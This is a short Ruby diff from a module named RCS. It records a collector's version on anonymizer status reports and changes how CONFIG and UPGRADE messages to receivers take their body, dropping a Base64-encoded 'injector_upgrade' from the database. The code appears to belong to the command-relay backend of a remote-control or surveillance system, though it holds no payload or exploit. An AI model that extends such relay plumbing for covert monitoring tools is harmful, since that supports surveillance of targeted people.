@@ -138,6 +138,7 @@ module RCS
 
         trace :info, "[NC] [#{name}] #{address} #{status} #{msg}"
         DB.instance.update_status name, address, status, msg, stats, 'anonymizer', version
+        DB.instance.update_collector_version(@anon['_id'], version)
 
         response << {command: 'STATUS', result: {status: 'OK'}}
       end
@@ -182,9 +183,9 @@ module RCS
         # prepare the command for the receiver
         case command['command']
           when 'config'
-            msg = {command: 'CONFIG', params: {}, body: command['params']}
+            msg = {command: 'CONFIG', params: {}, body: command['body']}
           when 'upgrade'
-            msg = {command: 'UPGRADE', params: {}, body: Base64.encode64(DB.instance.injector_upgrade(receiver['_id']))}
+            msg = {command: 'UPGRADE', params: {}, body: command['body']}
           when 'check'
             msg = {command: 'CHECK', params: {}}
         end
